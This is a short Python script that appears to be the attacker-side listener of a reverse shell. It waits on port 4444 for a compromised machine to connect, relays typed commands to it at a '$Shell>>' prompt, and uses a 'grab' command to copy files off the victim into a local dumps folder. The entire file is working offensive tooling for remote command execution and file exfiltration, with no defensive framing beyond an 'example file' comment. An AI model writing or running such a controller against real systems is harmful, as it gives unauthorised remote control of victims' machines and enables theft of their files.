import socket,os

## example file, change this
IP = '192.168.25.225'
PORT = 4444


def transfer(conn, command):
    path_save = os.getcwd()
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open(path_save+"/dumps/"+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode('utf8', errors='ignore')):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode('utf8', errors='ignore') in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)

def connect():
    s = socket.socket()
    s.bind((IP,PORT))
    s.listen(1)
    conn, addr = s.accept()
    print(f"GOT: {conn}:{addr}")
    while True:
        command = input("$Shell>> ")

        if command == "":
            command = "id"
            conn.send(command.encode('utf8', errors='ignore'))
            print(f"Data GOT: {conn.recv(1024).decode()}")

        if 'terminate' in command:
            conn.send('terminate'.encode('utf8', errors='ignore'))
            conn.close()
            break #exit while
        elif 'grab' in command:
            transfer(conn, command)
        else: 
            conn.send(command.encode('utf8', errors='ignore'))
            print(f"Data GOT: {conn.recv(1024).decode('ISO-8859-1')}")


def main():
    connect()


if __name__ == "__main__":
    main()
